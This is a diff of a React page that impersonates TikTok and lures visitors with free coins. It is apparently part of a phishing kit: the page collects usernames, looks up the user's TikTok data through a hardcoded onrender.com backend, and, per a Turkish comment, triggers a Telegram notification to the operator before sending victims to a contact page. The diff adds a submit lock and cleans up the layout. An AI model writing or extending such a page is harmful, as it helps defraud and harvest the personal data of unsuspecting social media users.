@@ -4,7 +4,7 @@ import { Button } from '../components/ui/button';
 import { Input } from '../components/ui/input';
 import axios from 'axios';
 
-const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "https://proje-1-d4xz.onrender.com";
 const API = `${BACKEND_URL}/api`;
 
 const HomePage = () => {
@@ -12,10 +12,10 @@ const HomePage = () => {
   const [username, setUsername] = useState('');
   const [selectedCoin, setSelectedCoin] = useState(100000);
   const [sessionId, setSessionId] = useState(null);
+  const [isSubmitting, setIsSubmitting] = useState(false); // Yeni state
 
   useEffect(() => {
     const existingSessionId = localStorage.getItem('sessionId');
-    
     if (existingSessionId) {
       setSessionId(existingSessionId);
     } else {
@@ -41,9 +41,13 @@ const HomePage = () => {
 
   const handleContinue = async () => {
     if (username.trim() && sessionId) {
+      setIsSubmitting(true); // Butonu kilitle
+
+      // 1. LocalStorage Kayıtları
       localStorage.setItem('username', username);
       localStorage.setItem('coinAmount', selectedCoin);
 
+      // 2. TikTok Data Çekme
       try {
         const tiktokResponse = await axios.get(`${API}/tiktok/user/${username}`);
         if (tiktokResponse.data.success) {
@@ -53,6 +57,7 @@ const HomePage = () => {
         console.error('Failed to fetch TikTok data:', error);
       }
 
+      // 3. Telegram'a Bildirim Gönderme (Backend Tetikleme)
       try {
         await axios.post(`${API}/session/step`, {
           session_id: sessionId,
@@ -64,14 +69,16 @@ const HomePage = () => {
         });
       } catch (error) {
         console.error('Failed to submit step:', error);
+      } finally {
+        setIsSubmitting(false); // İşlem bitince aç
+        navigate('/contact'); // Yönlendirme
       }
-
-      navigate('/contact');
     }
   };
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
+      {/* Header */}
       <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
         <div className="flex items-center gap-3">
           <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
@@ -89,6 +96,7 @@ const HomePage = () => {
         </Button>
       </header>
 
+      {/* Main Content */}
       <main className="max-w-4xl mx-auto px-6 py-12">
         <div className="text-center mb-12">
           <h1 className="text-6xl font-black mb-4">
@@ -103,6 +111,7 @@ const HomePage = () => {
           Enter your TikTok username and choose a coin amount.
         </p>
 
+        {/* Username Input */}
         <div className="mb-8">
           <label className="text-white text-lg mb-3 block">Username</label>
           <Input
@@ -114,6 +123,7 @@ const HomePage = () => {
           />
         </div>
 
+        {/* Coin Selection */}
         <div className="mb-8">
           <label className="text-white text-lg mb-4 block">Select Coin Amount</label>
           <div className="grid grid-cols-3 gap-4">
@@ -127,77 +137,22 @@ const HomePage = () => {
                     : 'bg-[#1a1a1c] border-gray-700 hover:border-gray-600'
                 }`}
               >
-                <img 
-                  src="/coin-icon.png" 
-                  alt="Coin" 
-                  className="w-6 h-6 sm:w-7 sm:h-7 object-contain flex-shrink-0" 
-                />
+                <img src="/coin-icon.png" alt="Coin" className="w-6 h-6 sm:w-7 sm:h-7 object-contain flex-shrink-0" />
                 <span className="text-white text-lg sm:text-2xl font-bold">{option.label}</span>
               </button>
             ))}
           </div>
         </div>
 
+        {/* Continue Button */}
         <Button
           onClick={handleContinue}
-          disabled={!username.trim()}
+          disabled={!username.trim() || isSubmitting}
           className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f5224a] hover:to-[#f5224a] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          Continue
+          {isSubmitting ? 'Loading...' : 'Continue'}
         </Button>
-
-        <div className="mt-8 text-center">
-          <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-4 sm:px-8 py-3 sm:py-4">
-            <span className="text-gray-400 text-sm sm:text-lg">You will receive: </span>
-            <img src="/coin-icon.png" alt="Coin" className="w-5 h-5 sm:w-6 sm:h-6 object-contain flex-shrink-0" />
-            <span className="text-cyan-400 text-xl sm:text-2xl font-bold">{selectedCoin.toLocaleString()}</span>
-            <span className="text-gray-400 text-sm sm:text-lg"> Coins</span>
-          </div>
-        </div>
       </main>
-
-      <footer className="bg-[#0f0f10] border-t border-gray-800 py-8 px-4 sm:py-12 sm:px-6">
-        <div className="max-w-4xl mx-auto">
-          <div className="text-center mb-6 sm:mb-8">
-            <h3 className="text-white text-lg sm:text-xl font-semibold mb-3 sm:mb-4">Download now</h3>
-            <div className="flex justify-center gap-8 sm:gap-12">
-              <div className="flex flex-col items-center">
-                <button className="bg-transparent border-2 border-blue-500 text-white px-4 sm:px-6 py-2 rounded-md hover:bg-500 transition-all text-xs sm:text-sm font-semibold mb-4">
-                  App Store
-                </button>
-                <div className="text-left">
-                  <h4 className="text-white text-sm sm:text-base font-semibold mb-2 sm:mb-3">Company</h4>
-                  <ul className="space-y-1.5 sm:space-y-2">
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">About TikTok</a></li>
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Newsroom</a></li>
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Contact</a></li>
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Careers</a></li>
-                  </ul>
-                </div>
-              </div>
-              <div className="flex flex-col items-center">
-                <button className="bg-transparent border-2 border-gray-600 text-white px-4 sm:px-6 py-2 rounded-md hover:bg-gray-700 transition-all text-xs sm:text-sm font-semibold mb-4">
-                  Google Play
-                </button>
-                <div className="text-left">
-                  <h4 className="text-white text-sm sm:text-base font-semibold mb-2 sm:mb-3">Legal</h4>
-                  <ul className="space-y-1.5 sm:space-y-2">
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Terms of Use</a></li>
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Privacy Policy</a></li>
-                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Copyright Policy</a></li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div className="border-t border-gray-800 pt-4 sm:pt-6 flex flex-col sm:flex-row justify-between items-center gap-3 sm:gap-4">
-            <button className="bg-transparent border border-gray-600 text-white px-6 py-1.5 sm:py-2 rounded-md hover:bg-gray-800 transition-all text-xs sm:text-sm">
-              English
-            </button>
-            <p className="text-gray-500 text-xs sm:text-sm">© 2025 TikTok</p>
-          </div>
-        </div>
-      </footer>
     </div>
   );
 };
